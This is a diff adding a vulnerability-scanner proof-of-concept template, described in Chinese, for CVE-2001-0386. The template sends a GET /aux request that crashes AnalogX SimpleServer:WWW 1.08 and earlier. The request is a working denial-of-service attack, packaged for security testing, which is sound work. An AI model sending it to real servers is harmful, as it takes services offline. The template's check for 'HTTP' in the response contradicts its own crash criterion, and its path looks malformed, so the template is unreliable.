@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "向 AnalogX SimpleServer:WWW 1.08 及之前版本发送 GET /aux 请求，触发 Windows 保留设备名称解析异常，导致服务进程崩溃。验证方法：发送恶意请求后服务器停止响应。"
+id = "POC-AVE-2001-0158"
+name = "AnalogX SimpleServer:WWW AUX Directory Denial of Service PoC"
+severity = "medium"
+tags = [
+    "cve-2001-0386",
+    "dos",
+    "aux",
+]
+vuln_id = [
+    "CVE-2001-0386",
+    "AVE-2001-0158",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/aux"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Connection = "close"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["HTTP"]
